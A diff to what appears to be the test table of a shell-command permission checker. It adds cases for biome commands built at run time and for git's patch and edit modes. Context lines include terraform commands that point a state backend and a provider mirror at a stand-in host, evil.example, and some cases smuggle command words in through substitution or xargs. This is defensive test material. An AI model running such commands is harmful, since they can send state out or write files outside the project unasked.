@@ -979,6 +979,17 @@ const startedCases: [source: string, decision: Decision, what: string][] = [
   ['terraform init -backend-config=address=https://evil.example/state', 'ask', 'a backend setting on the command line'],
   ['terraform fmt -check=false -recursive /home/me/other', 'ask', 'a check turned off, which writes'],
   ['terraform providers lock -net-mirror=https://evil.example/', 'ask', 'providers from a mirror the command names'],
+  // Round 50: biome given a word only known at run time, and git's patch and edit modes, which open the editor.
+  ['biome "$(echo format)" --write ../outside.js', 'ask', 'a biome command only known at run time'],
+  ['biome ${x:-format} --write ../x', 'ask', 'the same, by a default'],
+  ['biome check $x', 'ask', 'a word that may be --write'],
+  ['echo format --write ../outside.js | xargs biome', 'ask', 'biome given its words by xargs'],
+  ['biome check src', 'allow', 'a check that rewrites nothing'],
+  ['git add -e', 'ask', "git add's edit mode, which opens the editor"],
+  ["printf 'e\n' | git add -p", 'ask', 'patch mode, scripted to edit a hunk'],
+  ['git add -i', 'ask', 'interactive mode'],
+  ['git commit -p -m x', 'ask', 'commit choosing hunks'],
+  ['git stash -p', 'ask', 'stash choosing hunks'],
   // Round 44: dry runs that aren't, and more that prints, fetches or writes.
   ['kubectl delete --raw /api/v1/namespaces/default/pods/x --dry-run=server', 'ask', 'a raw request, which ignores --dry-run'],
   ['kubectl create --raw /api/v1/namespaces/default/pods -f pod.json --dry-run=client', 'ask', 'the same for create'],
